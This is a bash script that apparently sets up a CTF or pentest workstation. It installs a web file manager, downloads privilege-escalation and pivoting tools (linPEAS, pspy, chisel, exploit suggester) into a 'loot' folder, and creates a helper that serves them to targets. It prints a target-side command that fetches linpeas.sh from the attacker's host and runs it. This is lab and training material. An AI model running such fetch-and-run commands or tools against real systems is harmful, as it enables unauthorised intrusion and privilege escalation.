#!/bin/bash
# ctf_fileui.sh — filebrowser (web file UI) + loot server + serve helper
set -u
export DEBIAN_FRONTEND=noninteractive
export PATH="$HOME/.local/bin:$PATH"

echo "======================================================"
echo " [A] FILEBROWSER — web file manager (/files)"
echo "======================================================"
if ! command -v filebrowser >/dev/null 2>&1; then
  curl -fsSL https://raw.githubusercontent.com/filebrowser/filebrowser/master/get.sh | bash 2>&1 | tail -1
fi
DB="$HOME/filebrowser.db"
if [ ! -f "$DB" ]; then
  filebrowser config init --database "$DB" >/dev/null 2>&1
  filebrowser config set --address 127.0.0.1 --port 8081 --baseurl /files --root "$HOME" --database "$DB" >/dev/null 2>&1
  FBPASS=$(openssl rand -base64 9)
  filebrowser users add admin "$FBPASS" --perm.admin --database "$DB" >/dev/null 2>&1
  echo "$FBPASS" > "$HOME/.fb_pass"
  echo "  filebrowser PAROL: $FBPASS  (saqlandi: ~/.fb_pass)"
fi
sudo tee /etc/systemd/system/filebrowser.service >/dev/null <<EOF
[Unit]
Description=filebrowser web file manager
After=network.target
[Service]
User=ubuntu
ExecStart=/usr/local/bin/filebrowser --database $HOME/filebrowser.db
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload
sudo systemctl enable --now filebrowser >/dev/null 2>&1
sleep 2
echo "  filebrowser: $(systemctl is-active filebrowser)"

# nginx /files location
if ! grep -q 'location /files' /etc/nginx/conf.d/cybermentor.conf; then
  sudo sed -i '/location \/ {/i\    location /files/ {\n        proxy_pass http://127.0.0.1:8081;\n        proxy_set_header Host $host;\n        proxy_set_header X-Forwarded-Proto $scheme;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection upgrade;\n        client_max_body_size 1024m;\n    }\n' /etc/nginx/conf.d/cybermentor.conf
  sudo nginx -t >/dev/null 2>&1 && sudo systemctl reload nginx && echo "  ✓ nginx: /files yoqildi"
fi

echo
echo "======================================================"
echo " [B] LOOT SERVER — target'ga yuboriladigan asboblar"
echo "======================================================"
mkdir -p ~/ctf/serve && cd ~/ctf/serve
dl() { [ -f "$2" ] || curl -fsSL -o "$2" "$1" 2>/dev/null && echo "  ✓ $2" || echo "  ✗ $2"; }
dl https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh linpeas.sh
dl https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe winPEASx64.exe
dl https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 pspy64
dl https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32 pspy32
dl https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh les.sh
# chisel (pivoting) — gz
[ -f chisel ] || { curl -fsSL -o chisel.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz 2>/dev/null && gunzip -f chisel.gz && echo "  ✓ chisel"; }
chmod +x linpeas.sh les.sh pspy64 pspy32 chisel 2>/dev/null
echo "  Loot papka: ~/ctf/serve/"; ls -1 ~/ctf/serve/ | sed 's/^/    /'

# serve helper
cat > ~/.local/bin/serve <<'PP_SERVE'
#!/bin/bash
# serve [port] [dir] — fayllarni VPN orqali target'ga uzatish uchun HTTP server
P="${1:-8000}"; D="${2:-$HOME/ctf/serve}"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[0-9.]+')
echo "📡 Serving $D  ->  http://${IP:-<VPN-YOQ>}:$P/"
echo "   Target'da: wget http://${IP:-VPN}:$P/linpeas.sh -O /tmp/l.sh; bash /tmp/l.sh"
cd "$D" && python3 -m http.server "$P"
PP_SERVE
chmod +x ~/.local/bin/serve
echo "  ✓ 'serve' buyrug'i tayyor"

echo
echo "==== TAYYOR ===="
echo " Web file manager: https://cybermentor.uz/files/  (admin / ~/.fb_pass)"
echo " Loot server:      serve   (target'ga linpeas/chisel uzatish)"
[ -f ~/.fb_pass ] && echo " filebrowser parol: $(cat ~/.fb_pass)"
